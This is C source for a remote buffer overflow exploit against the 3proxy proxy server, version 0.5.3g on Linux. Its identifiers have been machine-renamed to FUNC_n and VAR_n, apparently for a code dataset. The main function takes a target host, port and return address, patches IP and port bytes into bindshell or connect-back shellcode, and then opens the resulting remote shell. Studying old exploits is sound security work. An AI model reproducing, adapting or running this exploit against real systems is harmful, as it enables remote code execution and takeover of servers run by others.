
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct hostent {scalar_t__ h_addr; } ;
typedef int s ;
typedef int in_addr_t ;
struct TYPE_2__ {int port; int sport; int addr; char* host; int off; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 void* FUNC_0 (int ) ;
 int FUNC_1 (int ) ;
 struct hostent* FUNC_2 (int ) ;
 int FUNC_3 (int,char**,char*) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (char*,int) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (char*,char*,int) ;
 int VAR_4 ;
 int FUNC_9 (char*,int) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int) ;
 int FUNC_12 (char*,int) ;
 int FUNC_13 (int ,char*,int*) ;
 scalar_t__ FUNC_14 (int ) ;
 unsigned int FUNC_15 (int*) ;
 TYPE_1__ VAR_5 ;
 int FUNC_16 (char*) ;
 int* VAR_6 ;
 int* VAR_7 ;
 int* VAR_8 ;

int FUNC_17(int VAR_9,char **VAR_10){
 signed int VAR_11=0,VAR_12=0;
 unsigned int VAR_13=0;
 struct hostent *VAR_14;
 in_addr_t VAR_15=0;
 FUNC_10("[*] 3proxy[v0.5.3g]: (linux) remote buffer overflow explo"
 "it.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 VAR_5.port=VAR_0;
 VAR_5.sport=VAR_2;
 VAR_5.addr=VAR_1;

 while((VAR_11=FUNC_3(VAR_9,VAR_10,"h:p:s:c:r:+:"))!=VAR_3){
  switch(VAR_11){
   case 'h':
    if(!VAR_5.host&&!(VAR_5.host=(char *)FUNC_14(VAR_4)))
     FUNC_9("main(): allocating memory failed",1);
    break;
   case 'p':
    VAR_5.port=FUNC_0(VAR_4);
    break;
   case 's':
    VAR_5.sport=FUNC_0(VAR_4);
    break;
   case 'c':
    if((VAR_15=FUNC_7(VAR_4))){
     if((VAR_14=FUNC_2(VAR_4)))
      FUNC_8((char *)&VAR_15,(char *)VAR_14->h_addr,sizeof(VAR_15));
     if(VAR_15==-1)VAR_15=0;
     if(!VAR_15)FUNC_9("invalid host/ip. (-c option)",0);
    }
    break;
   case 'r':
    FUNC_13(VAR_4,"%x",&VAR_5.addr);
    break;
   case '+':
    VAR_5.off=FUNC_0(VAR_4);
    break;
   default:
    FUNC_16(VAR_10[0]);
    break;
  }
 }
 if(!VAR_5.host)FUNC_16(VAR_10[0]);


 if(!VAR_15){
  VAR_13=FUNC_15(VAR_6);
  VAR_6[20]=(VAR_5.sport&0xff00)>>8;
  VAR_6[21]=(VAR_5.sport&0x00ff);
  VAR_8=VAR_6;
 }

 else{
  VAR_13=FUNC_15(VAR_7);
  VAR_7[33]=(VAR_15&0x000000ff);
  VAR_7[34]=(VAR_15&0x0000ff00)>>8;
  VAR_7[35]=(VAR_15&0x00ff0000)>>16;
  VAR_7[36]=(VAR_15&0xff000000)>>24;
  VAR_7[39]=(VAR_5.sport&0xff00)>>8;
  VAR_7[40]=(VAR_5.sport&0x00ff);
  VAR_8=VAR_7;
 }
 if(VAR_13!=FUNC_15(VAR_8))
  FUNC_9("ip(-c option) and/or port(-s option) appear to contain a "
  "null-byte, try again.",1);

 FUNC_10("[*] target\t\t\t: %s:%d\n",VAR_5.host,VAR_5.port);
 FUNC_10("[*] shellcode type\t\t: %s(port=%d)\n",
 (VAR_15?"connect-back":"bindshell"),VAR_5.sport);
 FUNC_10("[*] return address($eip)\t: 0x%.8x(+%d=0x%.8x)\n",VAR_5.addr,
 VAR_5.off,VAR_5.addr+VAR_5.off);

 if(VAR_15){
  VAR_12=FUNC_5(VAR_5.sport);
  FUNC_12(VAR_5.host,VAR_5.port);
  VAR_12=FUNC_4(VAR_12);
 }
 else{
  FUNC_12(VAR_5.host,VAR_5.port);
  VAR_12=FUNC_6(VAR_5.host,VAR_5.sport);
 }
 if(VAR_12>0)FUNC_11(VAR_12);
 FUNC_1(0);
}
